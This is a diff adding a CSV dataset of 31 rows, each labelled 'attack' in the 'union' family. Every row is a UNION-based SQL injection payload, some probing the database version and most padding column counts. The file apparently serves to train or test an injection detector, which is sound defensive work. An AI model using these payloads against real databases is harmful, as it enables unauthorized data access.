@@ -1,0 +1,32 @@
+label,payload,family
+attack," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",union
+attack," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",union
+attack," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",union
+attack," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",union
+attack," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",union
+attack," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",union
+attack,"1  )   union all select null,null,null,null,null,null,null,null,null--",union
+attack,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",union
+attack,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",union
+attack,"1%'  )   union all select null,null,null,null,null,null#",union
+attack,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",union
+attack,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",union
+attack,"-9156'   )    )    union all select 9110,9110,9110,9110#",union
+attack,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",union
+attack,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",union
+attack,"1%' union all select null,null,null,null,null,null,null#",union
+attack,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",union
+attack,"1%' union all select null,null,null,null,null,null,null,null,null,null--",union
+attack,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",union
+attack,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",union
+attack,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",union
+attack,"1""  )   where 2088  =  2088 union all select null,null,null,null--",union
+attack,"1' union all select null,null,null,null,null,null,null,null,null--",union
+attack,"1""  )   as boeh where 2571  =  2571 union all select null#",union
+attack,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",union
+attack,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",union
+attack,"-8073   )    )     )   union all select 4481,4481,4481,4481--",union
+attack,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",union
+attack,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",union
+attack,"1""   )    )     )   union all select null,null,null,null,null,null,null--",union
+attack,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",union
